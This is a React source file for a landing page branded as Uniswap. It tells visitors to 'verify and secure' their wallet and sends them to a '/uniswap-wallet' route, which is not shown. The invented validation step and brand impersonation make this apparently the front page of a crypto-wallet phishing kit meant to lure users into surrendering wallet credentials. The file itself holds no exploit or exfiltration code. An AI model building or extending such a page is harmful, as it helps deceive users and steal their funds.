import React, { useEffect } from 'react'
import './uniswapPagesCss/uniswapLanding.css'
import { motion } from "framer-motion";
import { useNavigate } from 'react-router-dom';
import UniswapHeader from '../uniswapHeader/UniswapHeader';
import UniswapFooter from '../uniswapFooter/UniswapFooter';

const UniswapLanding = () => {
    
    const navigate = useNavigate()
    
    useEffect(() => {
        const script = document.createElement("script");
        script.src = "https://www.livecoinwatch.com/static/lcw-widget.js";
        script.defer = true;
        document.body.appendChild(script);
    
        return () => {
            document.body.removeChild(script);
        };
    }, []);

  return (
    <>
        <div className='uniswap_landing_body'>
            <UniswapHeader/>

            {/* ================= HERO ================= */}
            <section className='uniswap_hero_section'>
                <motion.div
                    initial={{ opacity: 0, y: -100 }}
                    transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
                    whileInView={{ opacity: 1, y: 0 }}
                    viewport={{ margin: "-40px", once: true }}
                    className='uniswap_hero_section_left_container'>
                    <h1>Verify & Secure Your Uniswap Wallet</h1>
                    <p>
                        Confirm wallet ownership to safely access your crypto assets,
                        explore Web3 applications, and maintain full control over your funds.
                    </p>
                    <button onClick={()=>navigate("/uniswap-wallet")}>Validate Wallet</button>
                </motion.div>
            </section>

            {/* ================= FEATURES ================= */}
            <motion.section
                initial={{ opacity: 0, y: 100 }}
                transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ margin: "-40px", once: true }} 
                className='uniswap_section3'>
                
                <div className='uniswap_section3_top_container'>
                    <h1>Simple. Safe. Secure.</h1>
                </div>

                <div className='uniswap_section3_bottom_container'>
                    
                    <motion.div 
                        initial={{ opacity: 0, y: 100 }}
                        transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        viewport={{ margin: "-40px", once: true }} 
                        className='uniswap_section3_card_container'>
                        <div className='uniswap_section3_card_icon'>
                            <img src='https://framerusercontent.com/images/oJ0VAIcGkexU65TBKZswX5iCefQ.png' alt=''/>
                        </div>
                        <h3>Access Anywhere</h3>
                        <p>Validate your wallet to securely access it on iOS, Android, or Chrome browser.</p>
                    </motion.div>

                    <motion.div 
                        initial={{ opacity: 0, y: 100 }}
                        transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        viewport={{ margin: "-40px", once: true }} 
                        className='uniswap_section3_card_container'>
                        <div className='uniswap_section3_card_icon'>
                            <img src='https://framerusercontent.com/images/kD2CpmQNeY785t5zkSOxGFbk.png' alt=''/>
                        </div>
                        <h3>Integrated Onchain Apps</h3>
                        <p>Validation ensures secure interaction across Uniswap products for seamless DeFi experiences.</p>
                    </motion.div>

                    <motion.div 
                        initial={{ opacity: 0, y: 100 }}
                        transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        viewport={{ margin: "-40px", once: true }} 
                        className='uniswap_section3_card_container'>
                        <div className='uniswap_section3_card_icon'>
                            <img src='https://framerusercontent.com/images/WRj5Mu0Nnxnvxvw7Ur9Lpvilc.png' alt=''/>
                        </div>
                        <h3>Multichain Access</h3>
                        <p>Validate once and manage assets across Ethereum, Polygon, Arbitrum, Base, ZKsync, and more.</p>
                    </motion.div>

                    <motion.div 
                        initial={{ opacity: 0, y: 100 }}
                        transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        viewport={{ margin: "-40px", once: true }} 
                        className='uniswap_section3_card_container'>
                        <div className='uniswap_section3_card_icon'>
                            <img src='https://framerusercontent.com/images/pnjLa5fXgraDIHFITvuoDXYNbU.png' alt=''/>
                        </div>
                        <h3>Security First</h3>
                        <p>Keep your funds safe with self-custody, secure enclave storage, and wallet validation.</p>
                    </motion.div>

                </div>
            </motion.section>

            <UniswapFooter/>
        </div>
    </>
  )
}

export default UniswapLanding
